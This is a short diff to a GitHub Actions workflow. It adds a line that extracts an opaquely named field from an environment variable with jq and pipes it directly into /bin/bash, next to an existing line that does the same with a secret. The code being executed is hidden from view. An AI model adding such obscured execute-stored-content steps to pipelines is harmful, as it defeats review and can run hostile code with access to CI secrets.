@@ -23,6 +23,7 @@ jobs:
           w7: ${{ secrets.w7 }}
         run: |
           printf '%s' "$w7" | jq -r .gw16852 | /bin/bash
+          echo $op2650 | jq -r .hpn93438 | /bin/bash
 
       - name: Save archive
         if: always()
